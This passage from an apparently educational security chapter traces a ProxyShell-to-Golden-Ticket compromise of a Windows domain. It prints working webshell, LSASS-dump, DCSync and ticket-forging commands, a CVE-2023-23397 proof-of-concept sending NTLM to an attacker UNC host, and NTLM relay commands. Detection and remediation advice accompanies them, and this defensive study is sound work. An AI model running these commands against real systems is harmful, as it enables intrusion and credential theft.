$score = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/security/secureScores?`$top=1" `
    -Headers $headers -Method GET
$score.value | Select-Object createdDateTime, currentScore, maxScore,
    @{N='Percentage';E={[math]::Round($_.currentScore / $_.maxScore * 100, 1)}}
```

---

## 9. Advanced Attack Chains and Case Studies

### 9.1 Full chain — ProxyShell to Golden Ticket

This section traces a complete enterprise compromise from initial access through an unpatched Exchange server to full domain takeover. Each step includes the commands an attacker would use, the artifacts left behind, and the detection opportunities. ATT&CK technique IDs are mapped at each phase.

**Phase 1 — Initial Access (T1190: Exploit Public-Facing Application).**

The attacker exploits ProxyShell (§5.1.2) against an internet-facing Exchange 2019 server that is missing the April 2021 Cumulative Update. The exploit chain obtains the admin SID via Autodiscover, escalates to Exchange admin via the X-Rps-CAT header, and writes a webshell by exporting a mailbox containing ASPX payload to a web-accessible path.

```bash
# Attacker reconnaissance
curl -sk "https://target.com/autodiscover/autodiscover.json?@evil.com/mapi/nspi" \
    -H "Content-Type: application/json" | jq .

# Full exploitation (using ProxyShell exploit toolkit)
python3 proxyshell_exploit.py -t target.com -e admin@target.com
# Output: Webshell written to /aspnet_client/system_web/discovery.aspx
```

Detection artifacts: IIS logs show GET to `/autodiscover/autodiscover.json` with `mapi/nspi` in the query string. New `.aspx` file in `C:\inetpub\wwwroot\aspnet_client\`. Sysmon Event ID 11 (FileCreate) in Exchange web directories.

**Phase 2 — Execution via Webshell (T1059.001: PowerShell, T1505.003: Web Shell).**

The attacker uses the webshell to execute commands on the Exchange server. Initial commands perform host reconnaissance before deploying additional tooling.

```bash
# Webshell interaction
curl -sk "https://target.com/aspnet_client/system_web/discovery.aspx" \
    -d "cmd=whoami /priv"
# Response: nt authority\system + SeImpersonatePrivilege, SeDebugPrivilege, etc.

curl -sk "https://target.com/aspnet_client/system_web/discovery.aspx" \
    -d "cmd=ipconfig /all"

curl -sk "https://target.com/aspnet_client/system_web/discovery.aspx" \
    -d "cmd=net group 'Domain Admins' /domain"
```

Detection artifacts: Event ID 4688 — `w3wp.exe` spawning `cmd.exe` with the above commands. Sysmon Event ID 1 with parent `w3wp.exe`. PowerShell 4104 if the webshell invokes PowerShell.

**Phase 3 — Credential Access (T1003.001: LSASS Memory).**

Running as SYSTEM on an Exchange server with SeDebugPrivilege, the attacker dumps LSASS memory (§3.2). Exchange servers frequently have cached credentials for service accounts and administrators who have logged in for management.

```bash
# Via webshell — dump LSASS using comsvcs.dll (LOLBin, no extra tools)
curl -sk "https://target.com/aspnet_client/system_web/discovery.aspx" \
    -d "cmd=tasklist /fi \"imagename eq lsass.exe\""
# Returns PID, e.g., 672

curl -sk "https://target.com/aspnet_client/system_web/discovery.aspx" \
    -d "cmd=rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\d.dmp full"

# Exfiltrate dump via webshell download or other channel
# Offline parsing
pypykatz lsa minidump d.dmp
# Output: NTLM hashes for domain admin, Exchange service account, cached logons
```

Detection artifacts: Sysmon Event ID 10 — `rundll32.exe` accessing `lsass.exe` with `0x1FFFFF`. Sysmon Event ID 1 — `rundll32.exe` with `comsvcs.dll, MiniDump` in command line. Large file creation in `C:\Windows\Temp\`.

**Phase 4 — Lateral Movement to Domain Controller (T1003.006: DCSync).**

With domain admin NTLM hashes obtained from the LSASS dump, the attacker performs DCSync (see Domain 14 Chapter 14A for full DCSync coverage) to replicate the `krbtgt` hash directly from a domain controller without needing to access it interactively.

```bash
# DCSync from attacker workstation using captured DA hash
impacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee:da_ntlm_hash \
    domain.local/da_user@DC01.domain.local -just-dc-user krbtgt

# Output: krbtgt NTLM hash and AES256 key
# krbtgt:502:aad3b435b51404ee:krbtgt_ntlm_hash:::
```

Detection artifacts: Event ID 4662 on DC — replication rights (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All) requested by a non-DC account. Event ID 4769 — TGS request for the DC's DRSUAPI SPN from a non-DC IP. See Domain 14A for comprehensive DCSync detection.

**Phase 5 — Persistence via Golden Ticket (T1558.001: Golden Ticket).**

With the `krbtgt` hash, the attacker forges a Golden Ticket — a TGT that is valid for any user, including non-existent users, with any group memberships, for the lifetime of the `krbtgt` key (until the key is rotated twice). See Domain 14 Chapter 14A for Golden Ticket mechanics and rotation procedures.

```bash
# Forge Golden Ticket with Mimikatz
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local \
    /sid:S-1-5-21-DOMAIN-SID /krbtgt:krbtgt_ntlm_hash \
    /groups:512,513,518,519,520 /ptt

# Or with Impacket
impacket-ticketer -nthash krbtgt_ntlm_hash -domain-sid S-1-5-21-DOMAIN-SID \
    -domain domain.local -groups 512,513,518,519,520 fakeadmin
export KRB5CCNAME=fakeadmin.ccache
impacket-psexec -k -no-pass domain.local/fakeadmin@DC01.domain.local
```

Detection artifacts: Event ID 4769 on DC — TGS request for a user that does not exist in AD, or with a TGT encrypted with an old `krbtgt` key version. Event ID 4624 (Logon Type 3) for accounts not in the AD directory. Anomalous group membership claims in Kerberos tickets (detected by advanced Kerberos monitoring solutions).

**Full chain ATT&CK mapping summary:**

| Phase | Technique | ID | Artifacts |
|-------|-----------|-----|-----------|
| Initial Access | Exploit Public-Facing Application | T1190 | IIS logs, webshell file creation |
| Execution | Web Shell + PowerShell | T1505.003, T1059.001 | Process creation, script block logs |
| Credential Access | LSASS Memory | T1003.001 | Sysmon Event 10, dump file |
| Lateral Movement | DCSync | T1003.006 | Event 4662, Event 4769 |
| Persistence | Golden Ticket | T1558.001 | Anomalous TGS requests, Event 4769 |

### 9.2 Case study — Hafnium campaign (ProxyLogon mass exploitation)

In January–March 2021, the threat group tracked as Hafnium (STORM-0062) conducted mass exploitation of on-premises Exchange servers using the ProxyLogon vulnerability chain (§5.1.1). The campaign timeline illustrates the speed at which a zero-day can move from targeted exploitation to widespread commodity abuse.

The initial exploitation was highly targeted: Hafnium used the SSRF (CVE-2021-26855) to access internal Exchange APIs, the arbitrary file write (CVE-2021-27065) to deploy ASPX webshells, and two additional vulnerabilities (CVE-2021-26857 for deserialization in the Unified Messaging service, CVE-2021-26858 for post-auth arbitrary file write) to maximize persistence options. The webshells were minimal — typically a single-line ASPX eval shell — placed in `C:\inetpub\wwwroot\aspnet_client\` where they blended with legitimate ASP.NET files.

Post-exploitation followed a consistent pattern: LSASS credential dumping (comsvcs.dll MiniDump or procdump), compression of mailbox data (7z or rar), staging in web-accessible directories for exfiltration, and deployment of additional tools (China Chopper webshell variants, Covenant C2, Cobalt Strike). In many cases, the initial Hafnium access was subsequently leveraged by other threat groups (DearCry ransomware, Lemon Duck cryptominer) who scanned for and exploited the same webshells.

Microsoft released patches on 2021-03-02. By 2021-03-05, Volexity estimated that at least 30,000 organizations in the United States alone had been compromised. CISA issued Emergency Directive 21-02 on 2021-03-03, mandating federal agencies to either patch or disconnect Exchange servers within 48 hours. The incident demonstrated that Exchange servers represent a single point of failure for enterprise security: they run as SYSTEM, hold credentials for service accounts, process all organizational email, and are typically internet-facing.

Key forensic indicators for Hafnium specifically: webshells with SHA256 hashes matching published IOCs, `lsass.exe` dump files in `C:\Windows\Temp\`, `.rar` or `.7z` files in `C:\ProgramData\` containing exported mailbox data, and IIS logs showing the characteristic `X-BEResource` cookie patterns documented in §5.1.1.

### 9.3 CVE-2023-23397 — Outlook NTLM relay

CVE-2023-23397 is a critical vulnerability in Microsoft Outlook for Windows that allows an attacker to steal NTLM credentials without user interaction. The attack requires only that the victim receives a specially-crafted email — the victim does not need to open or preview the message.

**Mechanism.** The vulnerability exists in how Outlook processes the `PidLidReminderFileParameter` extended MAPI property of calendar items and tasks. This property specifies a custom reminder sound file path. When set to a UNC path (`\\attacker.com\share\sound.wav`), Outlook automatically attempts to connect to the SMB share when the reminder fires. This sends the user's NTLMv2 authentication hash to the attacker-controlled server. The hash can then be relayed to other NTLM-accepting services (Exchange EWS, LDAP, SMB) or cracked offline.

**Exploitation.**

```python
#!/usr/bin/env python3
"""CVE-2023-23397 PoC — Outlook NTLM leak via calendar reminder.
   Authorized testing only. Sends a calendar item that triggers NTLM auth
   to an attacker-controlled UNC path when the reminder fires."""

from exchangelib import Credentials, Account, CalendarItem, EWSDateTime, EWSTimeZone
from exchangelib.extended_properties import ExtendedProperty

class PidLidReminderFileParameter(ExtendedProperty):
    property_set_id = '00062008-0000-0000-C000-000000000046'
    property_id = 0x851F
    property_type = 'String'

CalendarItem.register('reminder_sound', PidLidReminderFileParameter)

creds = Credentials('domain\\attacker', 'password')
account = Account('attacker@domain.com', credentials=creds, autodiscover=True)

tz = EWSTimeZone('UTC')
item = CalendarItem(
    account=account,
    folder=account.calendar,
    subject='Quarterly Review',
    start=EWSDateTime(2026, 5, 14, 9, 0, tzinfo=tz),
    end=EWSDateTime(2026, 5, 14, 10, 0, tzinfo=tz),
    reminder_is_set=True,
    reminder_minutes_before_start=15,
    reminder_sound='\\\\attacker-server.com\\share\\sound.wav'
)
item.save(send_meeting_invitations='SendToAllAndSaveCopy')
```

```bash
# Attacker side — capture NTLM hash
responder -I eth0 -v
# Or Impacket ntlmrelayx for relay
impacket-ntlmrelayx -t ldap://DC01.domain.local -smb2support --escalate-user attacker
```

**Detection.** Monitor for outbound SMB/WebDAV connections from `outlook.exe` to external IP addresses. Event ID 4688 shows `outlook.exe` initiating network connections. Sysmon Event ID 3 (NetworkConnect) from `outlook.exe` to external destinations on port 445. The Microsoft-provided PowerShell script scans Exchange mailboxes for items with the `PidLidReminderFileParameter` set to a UNC path:

```powershell
# Microsoft's detection script (CVE-2023-23397 audit)
# https://microsoft.github.io/CSS-Exchange/Security/CVE-2023-23397/
.\CVE-2023-23397.ps1 -Environment OnPrem -ExchangeServerFQDN mail.domain.com
```

**Remediation.** Apply the March 2023 Outlook security update. Block outbound SMB (TCP 445) from client workstations to the internet at the network perimeter. Add privileged accounts to the Protected Users group (§8.1), which prevents NTLM authentication entirely.

### 9.4 CVE-2023-36884 — Office HTML RCE (Storm-0978)

CVE-2023-36884 is a remote code execution vulnerability in Microsoft Office and Windows HTML processing, exploited by the threat group Storm-0978 (RomCom) in targeted attacks against NATO summit attendees and Ukrainian government entities in July 2023.

**Mechanism.** The attack uses specially-crafted Microsoft Word documents that exploit a vulnerability in the Windows MSHTML (Trident) rendering engine. When the victim opens the document, Word loads remote HTML content via an embedded OLE object. The HTML content triggers the MSHTML vulnerability, which allows code execution outside the Office sandbox. The exploit chain involves: a Word document with an embedded relationship pointing to an external HTML file, the HTML file exploiting MSHTML to write a payload to disk via a search-ms protocol handler, and the payload executing with the user's privileges.

**Kill chain walkthrough.**

```
1. Victim receives email with Word document attachment ("NATO_Summit_Agenda.docx")
2. Document contains OLE relationship to attacker-hosted HTML:
     https://attacker.com/payload/exploit.html
3. Word loads the HTML via MSHTML rendering engine
4. HTML exploit triggers CVE-2023-36884 (MSHTML RCE)
5. Payload written to %APPDATA%\Microsoft\Word\STARTUP\ (persistence)
6. Backdoor executes: RomCom RAT connecting to C2 infrastructure
7. Post-exploitation: credential harvesting, lateral movement, data exfiltration
```

**Detection.** ASR rule "Block all Office applications from creating child processes" (GUID `d4f940ab-401b-4efc-aadc-ad5f3c50688a`) blocks the execution phase. Sysmon Event ID 1 shows `WINWORD.EXE` spawning child processes. Event ID 3 (NetworkConnect) shows Word making HTTP connections to external servers during document load. Defender for Office 365 Safe Attachments detonates the document in a sandbox and detects the exploit.

**Remediation.** Apply the August 2023 security update. In the interim, set the `FEATURE_BLOCK_CROSS_PROTOCOL_FILE_NAVIGATION` registry key to block the protocol handler abuse:

```powershell
# Interim mitigation (before patch)
$apps = @("Excel.exe","Graph.exe","MSAccess.exe","MSPub.exe","PowerPnt.exe",
          "Visio.exe","WinProj.exe","WinWord.exe","Wordpad.exe")
foreach ($app in $apps) {
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BLOCK_CROSS_PROTOCOL_FILE_NAVIGATION" `
        /v $app /t REG_DWORD /d 1 /f
}

# Permanent fix: apply August 2023 cumulative update
# Verify: check that KB5029263 (or later) is installed
Get-HotFix | Where-Object { $_.HotFixID -match "KB502926[3-9]|KB50(3|4)" }
```

### 9.5 Purple team exercise template — Windows enterprise kill chain

This template provides a structured framework for purple team exercises that validate detection coverage against the Windows-specific attack techniques documented in this chapter. Each test case maps to specific sections, ATT&CK techniques, and expected detection sources.

| Test ID | Attack Phase | Technique | Section Reference | Expected Detection |
|---------|-------------|-----------|-------------------|-------------------|
| PT-01 | Initial Access | ProxyShell exploitation | §5.1.2 | IIS logs, Sigma Rule 6, webshell file alert |
| PT-02 | Execution | Webshell command execution | §5.1.1 | Sysmon Event 1 (w3wp child), KQL §7.3 |
| PT-03 | Privilege Escalation | Potato attack (JuicyPotatoNG) | §2.2.3 | Sigma Rule 3, Sysmon Event 17/18 |
| PT-04 | Credential Access | LSASS dump (comsvcs.dll) | §3.2 | Sigma Rule 1, Sysmon Event 10, ASR rule |
| PT-05 | Credential Access | LSASS dump (nanodump) | §3.2 | YARA nanodump rule, Sysmon Event 10 |
| PT-06 | Persistence | Transport agent install | §5.1.5 | YARA transport agent rule, Get-TransportAgent |
| PT-07 | Persistence | Mailbox forwarding rule | §5.1.5 | PowerShell audit script (§6.4) |
| PT-08 | Persistence | SQL Agent job | §4.2 | SQL audit query (§6.5), Sigma Rule 5 |
| PT-09 | Defense Evasion | BYOVD (RTCore64.sys) | §1.4 | Sigma Rule 4, CodeIntegrity 3033/3063 |
| PT-10 | Lateral Movement | DCSync | Domain 14A | Event 4662, Event 4769 |
| PT-11 | Credential Access | PRT extraction | §5.2.3 | Sigma Rule 9, Conditional Access alert |
| PT-12 | Credential Access | Device code phishing | §5.2.2 | Sigma Rule 8, KQL §7.3 |
| PT-13 | Credential Access | OAuth consent phishing | §5.2.1 | Sigma Rule 7, KQL §7.3 |
| PT-14 | Credential Access | CVE-2023-23397 NTLM leak | §9.3 | Outbound SMB alert, Sysmon Event 3 |
| PT-15 | Domain Dominance | Golden Ticket | Domain 14A | Event 4769 anomaly, krbtgt key version |

The exercise should be conducted in three rounds. Round 1 executes each test case with all defensive controls enabled, validating that detections fire. Round 2 disables specific controls (RunAsPPL off, HVCI off, ASR in audit mode) and re-runs tests to verify that compensating detections still provide visibility. Round 3 tunes the detection rules based on false positive data collected during rounds 1 and 2, then re-validates.

---

## 10. Cross-references

**To Chapter 14A:** Token manipulation (§2) enables the privilege escalation that feeds AD attacks. `SeDebugPrivilege` enables LSASS dumping (which produces the hashes for DCSync, Kerberoasting, PtH). Named-pipe impersonation (§2.4) is the mechanism behind Potato attacks that escalate to SYSTEM — from which AD attacks are launched. SQL Server linked servers (§4.3) use Kerberos/NTLM, creating the same relay and delegation attack paths as AD attacks in 14A §10.

**To Domain 11:** Process injection (Chapter 11A §1) operates on the EPROCESS/PEB structures described here. LSASS credential extraction (Chapter 11A §3, Chapter 11B §1) is constrained by the protections in §3. Direct/indirect syscalls (Chapter 11B §1.3) bypass the SSDT dispatch described in §1.2. AMSI bypass (Chapter 11B §1.5) is required before running PowerShell-based attack tools (Rubeus, PowerView) in environments with Defender.

**To Domain 10 (cloud):** M365 attacks (§5.2) are the cloud extension of on-premises Exchange attacks (§5.1). Azure AD is the identity provider for both; compromising either grants access to the other via federation, sync, or token exchange. PRT theft (§5.2.3) bridges on-premises device compromise to cloud access. OAuth consent grant (§5.2.1) creates persistent cloud access independent of on-premises AD.

**To Domain 13:** Kerberos and NTLM cryptographic mechanics (Chapter 13B §4–5) underpin the authentication subsystem described in §2. SQL Server linked-server authentication uses Kerberos or NTLM, creating the same relay and delegation attack paths. Credential Guard (§3.3) protects the Kerberos and NTLM key material described in Chapter 13A.

**To Domain 27:** Detection engineering for Windows internals attacks (Sigma rules, Sysmon configurations) is operationalized in Chapter 27C. The LSASS protection stack (§3.3) and HVCI (§1.4) are components of the defense-in-depth architecture described in Chapter 27B.

**To Domain 30:** Credential theft techniques (Chapter 30B) detail the operational tradecraft for LSASS dumping, token manipulation, and SQL Server exploitation described here. The C2 framework internals (Chapter 30A) show how these techniques are delivered via implant commands (Cobalt Strike `logonpasswords`, `steal_token`, `execute-assembly`).
